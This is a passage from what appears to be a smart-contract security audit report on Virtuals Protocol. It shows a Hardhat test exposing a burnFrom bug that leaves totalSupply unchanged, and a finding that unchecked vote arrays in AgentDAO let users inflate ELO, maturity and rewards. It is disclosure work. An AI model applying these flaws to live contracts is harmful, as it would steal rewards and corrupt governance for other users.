<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">describe</span><span class="mtk1">(</span><span class="mtk8">"FERC20"</span><span class="mtk1">, </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">owner</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk4">let</span><span class="mtk1"> </span><span class="mtk12">addr1</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk11">beforeEach</span><span class="mtk1">(</span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    [</span><span class="mtk12">owner</span><span class="mtk1">, </span><span class="mtk12">addr1</span><span class="mtk1">] = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getSigners</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">FERC20</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">getContractFactory</span><span class="mtk1">(</span><span class="mtk8">"FERC20"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">token</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">FERC20</span><span class="mtk1">.</span><span class="mtk11">deploy</span><span class="mtk1">(</span><span class="mtk8">"FunToken"</span><span class="mtk1">, </span><span class="mtk8">"FUN"</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">"1000"</span><span class="mtk1">), </span><span class="mtk7">5</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">waitForDeployment</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">addr1</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">"100"</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk11">it</span><span class="mtk1">(</span><span class="mtk8">"should not reduce totalSupply when using burnFrom (BUG)"</span><span class="mtk1">, </span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">initialTotalSupply</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">totalSupply</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Burn tokens from addr1</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">burnFrom</span><span class="mtk1">(</span><span class="mtk12">addr1</span><span class="mtk1">.</span><span class="mtk12">address</span><span class="mtk1">, </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">parseEther</span><span class="mtk1">(</span><span class="mtk8">"50"</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">finalTotalSupply</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">token</span><span class="mtk1">.</span><span class="mtk11">totalSupply</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Esto debería fallar porque totalSupply no cambió</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">finalTotalSupply</span><span class="mtk1">).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk12">be</span><span class="mtk1">.</span><span class="mtk11">lt</span><span class="mtk1">(</span><span class="mtk12">initialTotalSupply</span><span class="mtk1">); </span><span class="mtk3">// &lt;- test para detectar el bug</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">});</span></span></span></code></pre>
<pre data-index="63" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// output</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">FERC20</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk7">1</span><span class="mtk1">) </span><span class="mtk12">should</span><span class="mtk1"> </span><span class="mtk12">not</span><span class="mtk1"> </span><span class="mtk12">reduce</span><span class="mtk1"> </span><span class="mtk12">totalSupply</span><span class="mtk1"> </span><span class="mtk12">when</span><span class="mtk1"> </span><span class="mtk12">using</span><span class="mtk1"> </span><span class="mtk11">burnFrom</span><span class="mtk1"> (</span><span class="mtk12">BUG</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">0</span><span class="mtk1"> </span><span class="mtk11">passing</span><span class="mtk1"> (2</span><span class="mtk12">s</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">1</span><span class="mtk1"> </span><span class="mtk12">failing</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">1</span><span class="mtk1">) </span><span class="mtk12">FERC20</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">     </span><span class="mtk12">should</span><span class="mtk1"> </span><span class="mtk12">not</span><span class="mtk1"> </span><span class="mtk12">reduce</span><span class="mtk1"> </span><span class="mtk12">totalSupply</span><span class="mtk1"> </span><span class="mtk12">when</span><span class="mtk1"> </span><span class="mtk12">using</span><span class="mtk1"> </span><span class="mtk11">burnFrom</span><span class="mtk1"> (</span><span class="mtk12">BUG</span><span class="mtk1">):</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  AssertionError: </span><span class="mtk12">expected</span><span class="mtk1"> </span><span class="mtk7">1000000000000000000000000000000000000000</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1"> </span><span class="mtk12">be</span><span class="mtk1"> </span><span class="mtk12">below</span><span class="mtk1"> </span><span class="mtk7">1000000000000000000000000000000000000000</span></span></span></code></pre>
<h3 style="position:relative;" id="explanation"><a class="anchor before" aria-label="explanation permalink" href="#explanation"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Explanation</h3>
<p>This test checks if the <code>burnFrom</code> function correctly reduces the total supply when the owner burns tokens from another user (<code>addr1</code>). In a properly implemented ERC20 token, burning tokens should reduce both the user’s balance and the total supply.</p>
<h3 style="position:relative;" id="what-this-means"><a class="anchor before" aria-label="what this means permalink" href="#what-this-means"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>What this means</h3>
<p>The test expected <code>finalTotalSupply</code> to be less than <code>initialTotalSupply</code>,
but both values were exactly the same: <code>1000000000000000000000000000000000000000</code></p>
<h3 style="position:relative;" id="the-core-issue"><a class="anchor before" aria-label="the core issue permalink" href="#the-core-issue"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>The core issue</h3>
<ul>
<li>Both <code>initialTotalSupply</code> and <code>finalTotalSupply</code> remain unchanged after burning.</li>
<li>Although <code>burnFrom</code> decreases the user’s balance and emits a Transfer (user, <code>address(0)</code>, amount) event (mimicking a burn), the <code>_totalSupply</code> is never updated.</li>
<li>This is a major inconsistency that breaks the expected behavior of a burn function and introduces risk.</li>
</ul>
<hr>
<h2 style="position:relative;" id="m-11-agentdao_castvote-doesnt-check-the-array-of-votes-emitted-which-determine-the-number-of-battles-fought-in-elocalculatorsol-allowing-the-user-to-increase-the-elo-of-a-contribution-unfairly-inflating-the-maturityimpact-of-servicenfts"><a class="anchor before" aria-label="m 11 agentdao_castvote doesnt check the array of votes emitted which determine the number of battles fought in elocalculatorsol allowing the user to increase the elo of a contribution unfairly inflating the maturityimpact of servicenfts permalink" href="#m-11-agentdao_castvote-doesnt-check-the-array-of-votes-emitted-which-determine-the-number-of-battles-fought-in-elocalculatorsol-allowing-the-user-to-increase-the-elo-of-a-contribution-unfairly-inflating-the-maturityimpact-of-servicenfts"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-45">[M-11] <code>AgentDAO::_castVote</code> doesn’t check the array of votes emitted, which determine the number of battles fought in <code>EloCalculator.sol</code>, allowing the user to increase the ELO of a contribution unfairly, inflating the maturity/impact of <code>ServiceNFTs</code></a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-771">Jeremias</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-389">oakcobalt</a> and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-132">Shinobi</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L129">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L129</a></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L189">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L189</a></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L174">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L174</a></p>
<h3 style="position:relative;" id="finding-description-6"><a class="anchor before" aria-label="finding description 6 permalink" href="#finding-description-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>We have this in their whitepaper:</p>
<blockquote>
<ul>
<li>When validating a model, validators are presented with two models anonymously for comparison. They go through 10 rounds of interaction with each model pair, selecting the better responses. After 10 rounds, a vote is submitted with the final outcomes.</li>
<li>Anonymity in model comparison prevents collusion and bias among validators and contributors, ensuring a fair model selection process.</li>
<li>Virtual Protocol has opted for the Elo Rating System for model comparison.”</li>
</ul>
</blockquote>
<p>Other than the issue of direct on-chain transactions submitted by validators, the elo calculation system of <code>serviceNft</code> isn’t actually capped at 10 rounds, but receives an arbitrary amount of votes that a user directly interacting with the service can determine, both in rounds and value.</p>
<p>This is the <code>AgentDAO</code> override of the <code>_castVote</code> function (to be called by <code>castVoteWithReasonAndParams</code>). It takes <code>params</code> as argument. Which is an encoded <code>uint8[]</code> array representing the result (votes) of those rounds.</p>
<pre data-index="64" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    function _castVote(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 proposalId,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        address account,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint8 support,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        string memory reason, </span></span>
<span class="grvsc-line"><span class="grvsc-source">        bytes memory params //@audit params can also be passed as arguments</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ) internal override returns (uint256) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (!votedPreviously &amp;&amp; hasVoted(proposalId, account)) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            ++_totalScore;</span></span>
<span class="grvsc-line"><span class="grvsc-source">            _scores[account].push(SafeCast.toUint48(block.number), SafeCast.toUint208(scoreOf(account)) + 1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            if (params.length &gt; 0 &amp;&amp; support == 1) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">@&gt;                _updateMaturity(account, proposalId, weight, params); //@audit params is never checked</span></span>
<span class="grvsc-line"><span class="grvsc-source">            }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .</span></span>
<span class="grvsc-line"><span class="grvsc-source">        return weight;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span></code></pre>
<p>As we saw in <code>agentDAO::_castVote</code>, the params are passed to the <code>agentDAO::_updateMaturity</code> function: </p>
<p><code>_updateMaturity</code> passes those to <code>_calculateMaturity</code>, to update the “maturity” of the proposal (which should be construed as a relevant measure that weights in the final importance of implementing a new service or not, related to the <code>ELO</code> and <code>weight</code> of vote):</p>
<pre data-index="65" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    function _updateMaturity(address account, uint256 proposalId, uint256 weight, bytes memory params /*votes*/) internal {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint8[] memory votes = abi.decode(params, (uint8[])); //@audit params has been decoded, but the length isn't checked</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 maturity = _calcMaturity(proposalId, votes);  //@audit this calls eloCalculator (shown below)</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        _proposalMaturities[proposalId] += (maturity * weight); //@audit here maturity is updated, affecting ServiceNfts' elo and impact</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        emit ValidatorEloRating(proposalId, account, maturity, votes);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span></code></pre>
<p>The issue arises in the fact that votes can be any amount of <code>uint8[]</code> votes that the user decided to pass as an argument.</p>
<p><code>_calcMaturity</code> calls the <code>eloCalculator::battleElo(maturity, votes)</code>, where votes will be the <code>uint8[]</code>. We can also know which elo participant is the one we vote for.</p>
<pre data-index="66" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    function _calcMaturity(uint256 proposalId, uint8[] memory votes) internal view returns (uint256) {</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        address contributionNft = IAgentNft(_agentNft).getContributionNft(); </span></span>
<span class="grvsc-line"><span class="grvsc-source">        address serviceNft = IAgentNft(_agentNft).getServiceNft();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 virtualId = IContributionNft(contributionNft).tokenVirtualId(proposalId);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint8 core = IContributionNft(contributionNft).getCore(proposalId);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 coreService = IServiceNft(serviceNft).getCoreService(virtualId, core);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 maturity = 100; </span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (coreService &gt; 0) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            maturity = IServiceNft(serviceNft).getMaturity(coreService); </span></span>
<span class="grvsc-line"><span class="grvsc-source">@&gt;            maturity = IEloCalculator(IAgentNft(_agentNft).getEloCalculator()).battleElo(maturity, votes);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            //@audit, battleElo is called with an arbitrary amount of uint8[] votes</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        return maturity;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span></code></pre>
<p>In <code>eloCalculator::battleElo</code>, the array of votes is used to determine the number of <code>battles</code> that the two elos fight, and the result of the vote determines how the <code>ELO</code> of each of the two participants (models) is affected. Since the ELO is affected by the amount and the result, a user could arbitrarily set both, increasing the ELO of the <code>ServiceNft</code>, and the proposal impact.</p>
<p>The function goes as follows:</p>
<pre data-index="67" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    function battleElo(uint256 currentRating, uint8[] memory battles) public view returns (uint256) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 eloA = 1000; </span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 eloB = 1000;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        //@audit battles is the votes params, the length of which we didn't check</span></span>
<span class="grvsc-line"><span class="grvsc-source">        for (uint256 i = 0; i &lt; battles.length; i++) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            uint256 result = mapBattleResultToGameResult(battles[i]); //@audit function that maps vote value to result</span></span>
<span class="grvsc-line"><span class="grvsc-source">            (uint256 change, bool negative) = Elo.ratingChange(eloB, eloA, result, k);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            change = _roundUp(change, 100);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            if (negative) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">                eloA -= change;</span></span>
<span class="grvsc-line"><span class="grvsc-source">                eloB += change;</span></span>
<span class="grvsc-line"><span class="grvsc-source">            } else {</span></span>
<span class="grvsc-line"><span class="grvsc-source">                eloA += change;</span></span>
<span class="grvsc-line"><span class="grvsc-source">                eloB -= change;</span></span>
<span class="grvsc-line"><span class="grvsc-source">            }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        //@audit we can arbitrarily raise the ELO to make our vote more impactful in maturity</span></span>
<span class="grvsc-line"><span class="grvsc-source">        return currentRating + eloA - 1000;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span></code></pre>
<p>The amount of times the change is affected to the ELO rating, is defined by that unchecked <code>uint8[]</code> array. Thus, allowing users to increase more than due maturity/ELO. The maturity of the proposal would be bigger than it should, and the <code>serviceNft</code> would also get a bigger impact than it should have.</p>
<p>An impact is a value calculated from the <code>serviceNft::maturity[proposalId]</code> (taken from <code>agentDAO::getMaturity(proposalId)</code> at mint call, and stored in the contract’s array), and is the difference of the current service, and the previous service maturity.</p>
<pre data-index="68" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    function updateImpact(uint256 virtualId, uint256 proposalId) public {</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Calculate impact</span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Get current service maturity</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 prevServiceId = _coreServices[virtualId][_cores[proposalId]];</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 rawImpact = (_maturities[proposalId] &gt; _maturities[prevServiceId])</span></span>
<span class="grvsc-line"><span class="grvsc-source">            ? _maturities[proposalId] - _maturities[prevServiceId]  //@audit raw-impact is the difference of maturities between proposals. An inflated votation might result in an inflated difference.</span></span>
<span class="grvsc-line"><span class="grvsc-source">            : 0;  </span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 datasetId = IContributionNft(contributionNft).getDatasetId(proposalId); </span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        _impacts[proposalId] = rawImpact;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (datasetId &gt; 0) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .</span></span>
<span class="grvsc-line"><span class="grvsc-source">        .</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        emit SetServiceScore(proposalId, _maturities[proposalId], _impacts[proposalId]);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span></code></pre>
<p>We don’t know what the current implementation of <code>agentReward</code> is, but for version of v2 or lower, it would allow for an inflated reward to contributor.</p>
<pre data-index="69" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    function _distributeContributorRewards(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 amount,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 virtualId,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        RewardSettingsCheckpoints.RewardSettings memory settings</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ) private {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        IAgentNft nft = IAgentNft(agentNft);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint8[] memory coreTypes = nft.virtualInfo(virtualId).coreTypes;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        IServiceNft serviceNftContract = IServiceNft(serviceNft);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        IContributionNft contributionNftContract = IContributionNft(contributionNft);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        Reward storage reward = _rewards[virtualId][_rewards[virtualId].length - 1];</span></span>
<span class="grvsc-line"><span class="grvsc-source">        reward.coreAmount = amount / coreTypes.length;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256[] memory services = nft.getAllServices(virtualId);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Populate service impacts</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 serviceId;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 impact;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        for (uint i = 0; i &lt; services.length; i++) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            serviceId = services[i];</span></span>
<span class="grvsc-line"><span class="grvsc-source">            impact = serviceNftContract.getImpact(serviceId);  //@audit &lt;--here impacts are taken from serviceNft</span></span>
<span class="grvsc-line"><span class="grvsc-source">            if (impact == 0) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">                continue;</span></span>
<span class="grvsc-line"><span class="grvsc-source">            }</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">            ServiceReward storage serviceReward = _serviceRewards[serviceId];</span></span>
<span class="grvsc-line"><span class="grvsc-source">            if (serviceReward.impact == 0) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">                serviceReward.impact = impact;</span></span>
<span class="grvsc-line"><span class="grvsc-source">            }</span></span>
<span class="grvsc-line"><span class="grvsc-source">            _rewardImpacts[reward.id][serviceNftContract.getCore(serviceId)] += impact; //&lt;-- impacts are rewarded</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span></code></pre>
<h3 style="position:relative;" id="impact-10"><a class="anchor before" aria-label="impact 10 permalink" href="#impact-10"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Users, or even contributors can spam it, leaving the <code>ServiceNft</code> of a proposal with an ELO that severely misrepresents what the actual value of the proposal could be, up to the limit differences that they required in <code>elo.sol</code>.</p>
<p>Moreover, since the impact (a param of a <code>serviceNft</code> which represents a value of sorts for the service over the previous implementation) is used to calculate contributor rewards (at least as it is shown in <code>AgentRewardv2.sol</code> and <code>AgentRewardv1.sol</code>), this could also inflate them, giving more rewards than due.</p>
<p>For <code>AgentRewardv3</code> we’d have to think that either it doesn’t rewards contributions, is partially used, or is unfinished. We don’t really know which one it is.</p>
